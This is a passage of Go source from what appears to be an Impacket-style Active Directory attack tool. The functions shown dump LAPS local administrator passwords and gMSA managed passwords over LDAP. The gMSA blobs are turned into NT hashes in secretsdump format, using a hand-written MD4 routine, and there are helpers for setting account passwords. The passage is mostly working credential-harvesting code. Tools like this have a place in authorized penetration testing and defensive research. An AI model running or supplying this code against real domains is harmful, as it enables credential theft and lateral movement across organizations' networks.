		[]string{"sAMAccountName", "dNSHostName", "ms-MCS-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
			"msLAPS-Password", "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime"})
	if err != nil {
		return fmt.Errorf("LAPS search failed: %v", err)
	}

	found := 0
	for _, entry := range result.Entries {
		hostname := entry.GetAttributeValue("dNSHostName")
		if hostname == "" {
			hostname = entry.GetAttributeValue("sAMAccountName")
		}

		// LAPS v1
		lapsV1 := entry.GetAttributeValue("ms-MCS-AdmPwd")
		if lapsV1 != "" {
			expiry := entry.GetAttributeValue("ms-Mcs-AdmPwdExpirationTime")
			log.Printf("[+] %s: %s (expires: %s)", hostname, lapsV1, formatWindowsTime(expiry))
			found++
		}

		// LAPS v2
		lapsV2 := entry.GetAttributeValue("msLAPS-Password")
		if lapsV2 != "" {
			log.Printf("[+] %s: %s (LAPS v2)", hostname, lapsV2)
			found++
		}
	}

	if found == 0 {
		log.Printf("[-] No LAPS passwords readable (insufficient privileges or LAPS not deployed)")
	} else {
		log.Printf("[+] Dumped %d LAPS password(s)", found)
	}

	return nil
}

// --- gMSA Dump Attack ---

func dumpGMSAAttack(client *gopacketldap.Client, config *Config) error {
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}

	log.Printf("[*] Dumping gMSA passwords...")

	result, err := client.Search(baseDN,
		"(objectClass=msDS-GroupManagedServiceAccount)",
		[]string{"sAMAccountName", "msDS-ManagedPassword", "distinguishedName"})
	if err != nil {
		return fmt.Errorf("gMSA search failed: %v", err)
	}

	if len(result.Entries) == 0 {
		log.Printf("[-] No gMSA accounts found")
		return nil
	}

	found := 0
	for _, entry := range result.Entries {
		sam := entry.GetAttributeValue("sAMAccountName")
		blobRaw := entry.GetRawAttributeValue("msDS-ManagedPassword")

		if len(blobRaw) == 0 {
			log.Printf("[-] %s: cannot read msDS-ManagedPassword (insufficient privileges)", sam)
			continue
		}

		ntHash := parseGMSABlob(blobRaw)
		if ntHash != nil {
			log.Printf("[+] %s:::aad3b435b51404eeaad3b435b51404ee:%s:::", sam, hex.EncodeToString(ntHash))
			found++
		} else {
			log.Printf("[-] %s: failed to parse gMSA blob", sam)
		}
	}

	if found == 0 {
		log.Printf("[-] No gMSA passwords readable")
	} else {
		log.Printf("[+] Dumped %d gMSA hash(es)", found)
	}

	return nil
}

// --- Utility Functions ---

// parseGMSABlob extracts the NT hash from an MSDS_MANAGEDPASSWORD_BLOB.
func parseGMSABlob(blob []byte) []byte {
	// MSDS_MANAGEDPASSWORD_BLOB:
	//   Version (2 bytes)
	//   Reserved (2 bytes)
	//   Length (4 bytes)
	//   CurrentPasswordOffset (2 bytes)
	//   OldPasswordOffset (2 bytes) [optional]
	if len(blob) < 10 {
		return nil
	}

	offset := binary.LittleEndian.Uint16(blob[8:10])
	if int(offset) >= len(blob) {
		return nil
	}

	// Find password end
	var passwordEnd int
	if len(blob) >= 12 {
		oldOffset := binary.LittleEndian.Uint16(blob[10:12])
		if oldOffset > 0 && int(oldOffset) < len(blob) && int(oldOffset) > int(offset) {
			passwordEnd = int(oldOffset)
		} else {
			passwordEnd = len(blob)
		}
	} else {
		passwordEnd = len(blob)
	}

	password := blob[offset:passwordEnd]
	if len(password) == 0 {
		return nil
	}

	// Compute NT hash: MD4(password)
	return md4Sum(password)
}

// md4Sum computes MD4 hash (for NT hash computation).
func md4Sum(data []byte) []byte {
	var a, b, c, d uint32 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

	// Pad message
	msg := make([]byte, len(data))
	copy(msg, data)
	origLen := len(msg)
	msg = append(msg, 0x80)
	for len(msg)%64 != 56 {
		msg = append(msg, 0)
	}
	bits := uint64(origLen) * 8
	lenBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(lenBytes, bits)
	msg = append(msg, lenBytes...)

	f := func(x, y, z uint32) uint32 { return (x & y) | (^x & z) }
	g := func(x, y, z uint32) uint32 { return (x & y) | (x & z) | (y & z) }
	h := func(x, y, z uint32) uint32 { return x ^ y ^ z }
	rl := func(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n)) }

	for i := 0; i < len(msg); i += 64 {
		var x [16]uint32
		for j := 0; j < 16; j++ {
			x[j] = binary.LittleEndian.Uint32(msg[i+j*4:])
		}

		aa, bb, cc, dd := a, b, c, d

		// Round 1
		r1 := func(a, b, c, d, xk uint32, s uint) uint32 { return rl(a+f(b, c, d)+xk, s) }
		a = r1(a, b, c, d, x[0], 3)
		d = r1(d, a, b, c, x[1], 7)
		c = r1(c, d, a, b, x[2], 11)
		b = r1(b, c, d, a, x[3], 19)
		a = r1(a, b, c, d, x[4], 3)
		d = r1(d, a, b, c, x[5], 7)
		c = r1(c, d, a, b, x[6], 11)
		b = r1(b, c, d, a, x[7], 19)
		a = r1(a, b, c, d, x[8], 3)
		d = r1(d, a, b, c, x[9], 7)
		c = r1(c, d, a, b, x[10], 11)
		b = r1(b, c, d, a, x[11], 19)
		a = r1(a, b, c, d, x[12], 3)
		d = r1(d, a, b, c, x[13], 7)
		c = r1(c, d, a, b, x[14], 11)
		b = r1(b, c, d, a, x[15], 19)

		// Round 2
		r2 := func(a, b, c, d, xk uint32, s uint) uint32 { return rl(a+g(b, c, d)+xk+0x5a827999, s) }
		a = r2(a, b, c, d, x[0], 3)
		d = r2(d, a, b, c, x[4], 5)
		c = r2(c, d, a, b, x[8], 9)
		b = r2(b, c, d, a, x[12], 13)
		a = r2(a, b, c, d, x[1], 3)
		d = r2(d, a, b, c, x[5], 5)
		c = r2(c, d, a, b, x[9], 9)
		b = r2(b, c, d, a, x[13], 13)
		a = r2(a, b, c, d, x[2], 3)
		d = r2(d, a, b, c, x[6], 5)
		c = r2(c, d, a, b, x[10], 9)
		b = r2(b, c, d, a, x[14], 13)
		a = r2(a, b, c, d, x[3], 3)
		d = r2(d, a, b, c, x[7], 5)
		c = r2(c, d, a, b, x[11], 9)
		b = r2(b, c, d, a, x[15], 13)

		// Round 3
		r3 := func(a, b, c, d, xk uint32, s uint) uint32 { return rl(a+h(b, c, d)+xk+0x6ed9eba1, s) }
		a = r3(a, b, c, d, x[0], 3)
		d = r3(d, a, b, c, x[8], 9)
		c = r3(c, d, a, b, x[4], 11)
		b = r3(b, c, d, a, x[12], 15)
		a = r3(a, b, c, d, x[2], 3)
		d = r3(d, a, b, c, x[10], 9)
		c = r3(c, d, a, b, x[6], 11)
		b = r3(b, c, d, a, x[14], 15)
		a = r3(a, b, c, d, x[1], 3)
		d = r3(d, a, b, c, x[9], 9)
		c = r3(c, d, a, b, x[5], 11)
		b = r3(b, c, d, a, x[13], 15)
		a = r3(a, b, c, d, x[3], 3)
		d = r3(d, a, b, c, x[11], 9)
		c = r3(c, d, a, b, x[7], 11)
		b = r3(b, c, d, a, x[15], 15)

		a += aa
		b += bb
		c += cc
		d += dd
	}

	result := make([]byte, 16)
	binary.LittleEndian.PutUint32(result[0:], a)
	binary.LittleEndian.PutUint32(result[4:], b)
	binary.LittleEndian.PutUint32(result[8:], c)
	binary.LittleEndian.PutUint32(result[12:], d)
	return result
}

// encodeUnicodePassword encodes a password for LDAP unicodePwd attribute.
// Format: UTF-16LE encoded string surrounded by double quotes.
func encodeUnicodePassword(password string) []byte {
	quoted := "\"" + password + "\""
	runes := []rune(quoted)
	encoded := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(encoded[i*2:], uint16(r))
	}
	return encoded
}

// generateRandomPassword creates a random password with mixed characters.
func generateRandomPassword(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"
	b := make([]byte, length)
	randBytes := make([]byte, length)
	rand.Read(randBytes)
	for i := range b {
		b[i] = chars[int(randBytes[i])%len(chars)]
	}
	return string(b)
}

// generateRandomAlphanumeric creates a random alphanumeric string.
// Matches Impacket's random.choice(string.ascii_letters + string.digits) pattern.
func generateRandomAlphanumeric(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	randBytes := make([]byte, length)
	rand.Read(randBytes)
	for i := range b {
		b[i] = chars[int(randBytes[i])%len(chars)]
	}
	return string(b)
}

// formatWindowsTime converts a Windows FILETIME string to human-readable format.
func formatWindowsTime(s string) string {
	if s == "" {
		return "N/A"
	}
	val, err := strconv.ParseInt(s, 10, 64)
	if err != nil || val == 0 {
		return s
	}
	const ticksPerSecond = 10000000
	const epochDiff = 11644473600
	unixTime := (val / ticksPerSecond) - epochDiff
	if unixTime < 0 {
		return "Never"
	}
	return time.Unix(unixTime, 0).Format("2006-01-02 15:04:05")
}
